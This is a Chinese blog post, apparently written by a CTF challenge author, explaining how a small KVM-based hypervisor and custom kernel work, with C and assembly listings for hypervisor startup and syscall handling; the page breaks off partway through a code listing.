<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">



  
  
    
    
  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
  <link href="/lib/pace/pace-theme-flash.min.css?v=1.0.2" rel="stylesheet">







<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">




  
  
  
  

  
    
    
  

  
    
      
    

    
  

  

  

  
    
      
    

    
  

  
    
    
    <link href="//fonts.googleapis.com/css?family=STZhongsong:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|consolas:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/014.jpg?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/014.jpg?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/014.jpg?v=5.1.4">






  <meta name="keywords" content="summary,KVM,TSCTF,">










<meta name="description" content="前言在为TSCTF2020出题的时候，一直想往赛题里加一点kernel和虚拟化的元素进去，但是常规的kernel题或者虚拟机逃逸又太套路了很没意思，后来在查资料的时候无意中看到了这个： https://github.com/david942j/kvm-kernel-example  KVM-Kernel ExampleThe source code are examples on my blog:">
<meta name="keywords" content="summary,KVM,TSCTF">
<meta property="og:type" content="article">
<meta property="og:title" content="KVM学习-如何利用kvm写一个自己的Hypervisor">
<meta property="og:url" content="http://yoursite.com/2020/10/10/KVM学习—利用KVM实现一个简易的Hypervisor/index.html">
<meta property="og:site_name" content="xiaoxiaorenwu">
<meta property="og:description" content="前言在为TSCTF2020出题的时候，一直想往赛题里加一点kernel和虚拟化的元素进去，但是常规的kernel题或者虚拟机逃逸又太套路了很没意思，后来在查资料的时候无意中看到了这个： https://github.com/david942j/kvm-kernel-example  KVM-Kernel ExampleThe source code are examples on my blog:">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://s3.ax1x.com/2021/02/27/6SRKMT.md.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/02/27/6SRJiR.md.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/02/27/6SRIoj.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/02/27/6SRrod.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/02/27/6SfmuT.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/02/27/6SfME4.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/02/27/6Sf5Ps.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/02/27/6Shnzt.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/02/27/6pNPmV.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/02/27/6pNlTO.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/02/27/6pNUXt.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/02/27/6pN078.png">
<meta property="og:image" content="https://md.byr.moe/uploads/upload_a717dd9bca8e462303b06dd5e311c57a.png">
<meta property="og:image" content="https://md.byr.moe/uploads/upload_48ae4cffcaf79df32ca43ca6d36012e6.png">
<meta property="og:image" content="https://md.byr.moe/uploads/upload_3f4c4f96147afd44bfe9ab7e4a75c09e.png">
<meta property="og:image" content="https://md.byr.moe/uploads/upload_c7df0057fb06181abe3c2f69d5432f21.png">
<meta property="og:image" content="https://md.byr.moe/uploads/upload_b308ec2e3ad708665601c72cf33f1660.png">
<meta property="og:image" content="https://md.byr.moe/uploads/upload_bb8e3fd264df16de341441675961e636.png">
<meta property="og:image" content="https://md.byr.moe/uploads/upload_920551443302e85ffd847c5dfffcb72f.png">
<meta property="og:updated_time" content="2021-02-27T10:08:10.559Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="KVM学习-如何利用kvm写一个自己的Hypervisor">
<meta name="twitter:description" content="前言在为TSCTF2020出题的时候，一直想往赛题里加一点kernel和虚拟化的元素进去，但是常规的kernel题或者虚拟机逃逸又太套路了很没意思，后来在查资料的时候无意中看到了这个： https://github.com/david942j/kvm-kernel-example  KVM-Kernel ExampleThe source code are examples on my blog:">
<meta name="twitter:image" content="https://s3.ax1x.com/2021/02/27/6SRKMT.md.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","width":350,"display":"hide","offset":20,"b2t":true,"scrollpercent":true,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2020/10/10/KVM学习—利用KVM实现一个简易的Hypervisor/">





  <title>KVM学习-如何利用kvm写一个自己的Hypervisor | xiaoxiaorenwu</title>
  








</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta custom-logo">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">xiaoxiaorenwu</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">生活的艰辛，三分来自压力，七分来自攀比，我想做个小人物</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/10/10/KVM学习—利用KVM实现一个简易的Hypervisor/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/xxrw.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="xiaoxiaorenwu">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">KVM学习-如何利用kvm写一个自己的Hypervisor</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-10-10T00:05:04+08:00">
                2020-10-10
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/Qemu-KVM学习/" itemprop="url" rel="index">
                    <span itemprop="name">Qemu&KVM学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2020/10/10/KVM学习—利用KVM实现一个简易的Hypervisor/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2020/10/10/KVM学习—利用KVM实现一个简易的Hypervisor/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          
            <span class="post-meta-divider">|</span>
            <span class="page-pv"><i class="fa fa-file-o"></i>
            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
            </span>
          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  5.6k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  26 min
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在为<code>TSCTF2020</code>出题的时候，一直想往赛题里加一点<code>kernel</code>和虚拟化的元素进去，但是常规的<code>kernel</code>题或者虚拟机逃逸又太套路了很没意思，后来在查资料的时候无意中看到了这个：</p>
<p><a href="https://github.com/david942j/kvm-kernel-example" target="_blank" rel="noopener">https://github.com/david942j/kvm-kernel-example</a></p>
<blockquote>
<h1 id="KVM-Kernel-Example"><a href="#KVM-Kernel-Example" class="headerlink" title="KVM-Kernel Example"></a>KVM-Kernel Example</h1><p>The source code are examples on my blog: <a href="https://david942j.blogspot.com/2018/10/note-learning-kvm-implement-your-own.html" target="_blank" rel="noopener">Learning KVM - implement your own kernel</a>.</p>
<p>I’ve described how to implement a KVM-based hypervisor and the key points to implement a kernel on my blog. You can leave comments in the blog or file issues here if you have questions or find any bug.</p>
</blockquote>
<p><code>david942j</code>巨佬(没错，就是开发<code>one_gadget</code>的那个湾湾巨佬)的一个小项目，用<code>kvm</code>跑一个自己开发的小型内核，然后我觉得非常有意思，就想以此为基础出一道多层的<code>pwn</code>题目，但是在开发方面我比较弱，所以计划用两周时间改学习进此小项目，然后再花一周构思题目的，但是惊喜的发现这个思路已经被大佬出成题目过了。。。是<code>2018Hitcon</code>的<code>Bypass</code>，而且有<code>user</code>，<code>kernel</code>，<code>hypervisor</code>三层。而且此题目的<a href="https://github.com/david942j/ctf-writeups/tree/master/hitcon-2018/abyss" target="_blank" rel="noopener">源码</a>也已经被公布，拜读一番后觉得非常符合我的诉求，于是学习了一波之后，拿大佬的源码为基础创造了<code>hellovirtual</code>这道题，我只留了两层，原因有三，一是校内赛感觉两层已经足够(比赛结果证明我的想法是对的)，二是<code>hypervisor</code>那层大佬的原漏洞是留了一个<code>hypercall</code>后门，我想了一段时间没想到还能咋在<code>hypervisor</code>构造漏洞，三是出题时间不够了。</p>
<h1 id="源码学习"><a href="#源码学习" class="headerlink" title="源码学习"></a>源码学习</h1><p>其有三个文件夹<code>hypervisor</code>，<code>kernel</code>，<code>user</code>：</p>
<ul>
<li><code>user</code>文件夹就是普通的<code>pwn</code>用户态程序。</li>
<li><code>kernel</code>文件夹放自定义的极简内核，其通过注册<code>syscall_table[]</code>来自定义系统调用实现与上层用户态通信的效果，并且通过<code>hypercall()</code>函数与下层的<code>hypervisor</code>通信。</li>
<li><code>hypervisor</code>文件夹用<code>kvm</code>实现了一个小的虚拟机管理程序，并且负责处理上层<code>kernel</code>利用<code>hypercall</code>发来的<code>I/O</code>请求。</li>
</ul>
<p>经典的半虚拟化<code>I/O</code>架构，主要分析一下<code>kernel</code>和<code>hypervisor</code>。</p>
<h2 id="hypervisor"><a href="#hypervisor" class="headerlink" title="hypervisor"></a>hypervisor</h2><p><code>main</code>函数位于<code>hypervisor.c</code>中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(argc &lt; <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Usage: %s kernel.bin &lt;static-elf&gt; [args...]\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">  &#125;</span><br><span class="line">  alarm(<span class="number">60</span>);</span><br><span class="line">  <span class="keyword">uint8_t</span> *code;</span><br><span class="line">  <span class="keyword">size_t</span> len;</span><br><span class="line">  read_file(argv[<span class="number">1</span>], &amp;code, &amp;len);</span><br><span class="line">  <span class="keyword">if</span>(len &gt; MAX_KERNEL_SIZE)</span><br><span class="line">    error(<span class="string">"Kernel size exceeded, %p &gt; MAX_KERNEL_SIZE(%p).\n"</span>,</span><br><span class="line">      (<span class="keyword">void</span>*) len,</span><br><span class="line">      (<span class="keyword">void</span>*) MAX_KERNEL_SIZE);</span><br><span class="line">  VM* vm = kvm_init(code, len);</span><br><span class="line">  copy_argv(vm, argc - <span class="number">2</span>, &amp;argv[<span class="number">2</span>]);</span><br><span class="line">  execute(vm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因代码较多，只分析其核心逻辑，主要分为4步：</p>
<ol>
<li><code>read_file</code>函数：从命令行读取参数，将<code>argv[1]</code>文件作为<code>kernel</code>文件，加载进内存中。</li>
<li><code>kvm_init</code>函数：对<code>kvm</code>进行初始化，创建三大<code>fd</code>，设置寄存器(<code>rip(内核代码入口)/rsp(内核堆栈)/rdi(内核启动参数)/rsi(内核启动参数)</code>等)，设置页表，开启<code>64bit long mode</code>，开启<code>syscall/sysenter</code>指令等，这部分知识较杂，可以阅读原文章。</li>
<li><code>copy_argv</code>函数：将<code>argv[2]</code>文件内容拷贝到<code>kernel stack</code>，<code>kernel</code>启动时将会运行此程序。</li>
<li><code>execute</code>函数：运行<code>kvm</code>，启动内核。</li>
</ol>
<p>几个关键点：</p>
<ol>
<li><p>关于<code>hypercall</code>：了解过半虚拟化方面的知识，我们知道<code>hypervisor</code>可以装载被魔改过的<code>kernel</code>，<code>kernel</code>对硬件的请求将会以<code>hypercall</code>的形式被<code>hypervisor</code>监听并处理，此项目就是一个标准的半虚拟化模式，当<code>kvm</code>退出时，<code>hypervisor</code>会检测退出原因，如果为<code>KVM_EXIT_IO</code>，也就是监听到<code>kernel</code>使用<code>IN/OUT</code>指令访问了端口，则交由<code>hp_handler(hypercall函数处理句柄)</code>函数处理：</p>
<p><img src="https://s3.ax1x.com/2021/02/27/6SRKMT.md.png" alt="6SRKMT.md.png"></p>
<p>可以看到共有10个<code>hypercall</code>端口，分别为<code>8000/8001/8002/8003/8004/8005/8006/8007/8008/f777</code>，<code>kerenl</code>访问对应端口将有对应的<code>hypercall</code>处理函数来接手处理：</p>
<p><img src="https://s3.ax1x.com/2021/02/27/6SRJiR.md.png" alt="6SRJiR.md.png"></p>
<p><img src="https://s3.ax1x.com/2021/02/27/6SRIoj.png" alt=""></p>
<p><img src="https://s3.ax1x.com/2021/02/27/6SRrod.png" alt=""></p>
</li>
<li><p><code>EFER</code>寄存器，其是一个比较特殊的<code>MSR</code>寄存器，它既控制着能否进入<code>64 bits log mode</code>，又控制着开启<code>syscall/sysenter</code>指令，还控制着是否开启<code>NEX</code>保护：</p>
<p>关于<code>EFER</code>寄存器</p>
<p><a href="https://www.cnblogs.com/alwaysking/p/12439207.html" target="_blank" rel="noopener">https://www.cnblogs.com/alwaysking/p/12439207.html</a></p>
<p><img src="https://s3.ax1x.com/2021/02/27/6SfmuT.png" alt=""></p>
</li>
</ol>
<p><img src="https://s3.ax1x.com/2021/02/27/6SfME4.png" alt=""></p>
<p>接下来将分析<code>kernel</code>层的实现。</p>
<h2 id="kernel"><a href="#kernel" class="headerlink" title="kernel"></a>kernel</h2><p>由于刚分析完<code>hypervisor</code>，所以先来看<code>kernel</code>中与<code>hypervisor</code>对接的地方，首先是入口，从堆栈上取出<code>hypersivor</code>中<code>copy_argv</code>函数已经布置好的参数，然后进入<code>kernel_main</code>，正式进入内核：</p>
<p><img src="https://s3.ax1x.com/2021/02/27/6Sf5Ps.png" alt=""></p>
<p>核心逻辑分4步：</p>
<p><img src="https://s3.ax1x.com/2021/02/27/6Shnzt.png" alt=""></p>
<ol>
<li><code>init_pagetable</code>函数，初始化页表，设置虚拟地址和物理地址的对应规则。</li>
<li><code>init_allocator</code>函数，初始化动态内存区，设置<code>arena</code>和<code>topchunk</code>的<code>addr</code>和<code>size·</code>。</li>
<li><code>register_syscall</code>函数，注册<code>syscall</code>入口处理函数<code>syscall_entry</code>。</li>
<li><code>switch_user</code>函数，切换到用户态，运行用户传入的程序，也就是<code>argv[2]</code>文件。</li>
</ol>
<p>先看<code>syscall</code>部分，<code>syscall</code>可以说是此项目的核心，上接用户态程序，下接<code>hypercall</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">register_syscall</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">asm</span>(</span><br><span class="line">    <span class="string">"xor rax, rax;"</span></span><br><span class="line">    <span class="string">"mov rdx, 0x00200008;"</span></span><br><span class="line">    <span class="string">"mov ecx, %[msr_star];"</span></span><br><span class="line">    <span class="string">"wrmsr;"</span></span><br><span class="line"></span><br><span class="line">    <span class="string">"mov eax, %[fmask];"</span></span><br><span class="line">    <span class="string">"xor rdx, rdx;"</span></span><br><span class="line">    <span class="string">"mov ecx, %[msr_fmask];"</span></span><br><span class="line">    <span class="string">"wrmsr;"</span></span><br><span class="line"></span><br><span class="line">    <span class="string">"lea rax, [rip + syscall_entry];"</span> <span class="comment">//注册syscall_entry为用户系统调用后kernel的处理入口</span></span><br><span class="line">    <span class="string">"mov rdx, %[base] &gt;&gt; 32;"</span></span><br><span class="line">    <span class="string">"mov ecx, %[msr_syscall];"</span></span><br><span class="line">    <span class="string">"wrmsr;"</span></span><br><span class="line">    :: [msr_star]<span class="string">"i"</span>(MSR_STAR),</span><br><span class="line">       [fmask]<span class="string">"i"</span>(<span class="number">0x3f7fd5</span>), [msr_fmask]<span class="string">"i"</span>(MSR_SYSCALL_MASK),</span><br><span class="line">       [base]<span class="string">"i"</span>(KERNEL_BASE_OFFSET), [msr_syscall]<span class="string">"i"</span>(MSR_LSTAR)</span><br><span class="line">    : <span class="string">"rax"</span>, <span class="string">"rdx"</span>, <span class="string">"rcx"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//==================================================================================</span></span><br><span class="line"><span class="comment">//syscall_entry代码:</span></span><br><span class="line">syscall_entry:</span><br><span class="line">  mov [rip + user_stack], rsp</span><br><span class="line">  mov rsp, [rip + kernel_stack]</span><br><span class="line">  <span class="comment">/* save non-callee saved registers */</span></span><br><span class="line">  push rdi</span><br><span class="line">  push rsi</span><br><span class="line">  push rdx</span><br><span class="line">  push rcx</span><br><span class="line">  push r8</span><br><span class="line">  push r9</span><br><span class="line">  push r10</span><br><span class="line">  push r11</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* the forth argument */</span></span><br><span class="line">  mov rcx, r10</span><br><span class="line">  call syscall_handler  <span class="comment">//核心处理函数</span></span><br><span class="line"></span><br><span class="line">  pop r11</span><br><span class="line">  pop r10</span><br><span class="line">  pop r9</span><br><span class="line">  pop r8</span><br><span class="line">  pop rcx</span><br><span class="line">  pop rdx</span><br><span class="line">  pop rsi</span><br><span class="line">  pop rdi</span><br><span class="line"></span><br><span class="line">  mov rsp, [rip + user_stack]</span><br><span class="line">  .byte <span class="number">0x48</span></span><br><span class="line">  sysret</span><br><span class="line"><span class="comment">//============================================================================================</span></span><br><span class="line"><span class="comment">//系统调用表，系统调用号和处理函数的对应表</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">void</span>* syscall_table[MAX_SYS_NR + <span class="number">1</span>] = &#123;</span><br><span class="line">#define ENTRY(f) [SYS_##f]=sys_##f</span><br><span class="line"></span><br><span class="line">  ENTRY(read),</span><br><span class="line">  ENTRY(write),</span><br><span class="line">  ENTRY(open),</span><br><span class="line">  ENTRY(close),</span><br><span class="line">  ENTRY(fstat),</span><br><span class="line">  ENTRY(mmap),</span><br><span class="line">  ENTRY(mprotect),</span><br><span class="line">  ENTRY(munmap),</span><br><span class="line">  ENTRY(brk),</span><br><span class="line">  ENTRY(writev),</span><br><span class="line">  ENTRY(access),</span><br><span class="line">  <span class="comment">/* ENTRY(execve), */</span></span><br><span class="line">  ENTRY(<span class="built_in">exit</span>),</span><br><span class="line">  ENTRY(arch_prctl),</span><br><span class="line">  ENTRY(fadvise64),</span><br><span class="line">  ENTRY(exit_group),</span><br><span class="line">  ENTRY(openat),</span><br><span class="line"></span><br><span class="line">#undef ENTRY</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//============================================================================================</span></span><br><span class="line"><span class="comment">//核心处理函数，可以看到不同的系统调用号对应不同的处理函数，这些系统调用号和标准系统调用号是一样的</span></span><br><span class="line"><span class="keyword">uint64_t</span> syscall_handler(</span><br><span class="line">  <span class="keyword">uint64_t</span> arg0, <span class="keyword">uint64_t</span> arg1, <span class="keyword">uint64_t</span> arg2,</span><br><span class="line">  <span class="keyword">uint64_t</span> arg3, <span class="keyword">uint64_t</span> arg4, <span class="keyword">uint64_t</span> arg5) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">uint32_t</span> nr;</span><br><span class="line">  <span class="keyword">asm</span>(<span class="string">"mov %[nr], eax;"</span></span><br><span class="line">    : [nr] <span class="string">"=r"</span>(nr)</span><br><span class="line">    );</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> *sys = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">switch</span>(nr) &#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0</span>: sys = <span class="string">"read"</span>; <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">1</span>: sys = <span class="string">"write"</span>; <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">2</span>: sys = <span class="string">"open"</span>; <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">3</span>: sys = <span class="string">"close"</span>; <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">5</span>: sys = <span class="string">"fstat"</span>; <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">9</span>: sys = <span class="string">"mmap"</span>; <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">10</span>: sys = <span class="string">"mprotect"</span>; <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">11</span>: sys = <span class="string">"munmap"</span>; <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">12</span>: sys = <span class="string">"brk"</span>; <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">20</span>: sys = <span class="string">"writev"</span>; <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">21</span>: sys = <span class="string">"access"</span>; <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">59</span>: sys = <span class="string">"execve"</span>; <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">60</span>: sys = <span class="string">"exit"</span>; <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">63</span>: sys = <span class="string">"[not implemented] uname"</span>; <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">158</span>: sys = <span class="string">"arch_prctl"</span>; <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">221</span>: sys = <span class="string">"fadvise64"</span>; <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">231</span>: sys = <span class="string">"exit_group"</span>; <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">257</span>: sys = <span class="string">"openat"</span>; <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">default</span>: sys = <span class="string">"unsupported"</span>;</span><br><span class="line">  &#125;</span><br><span 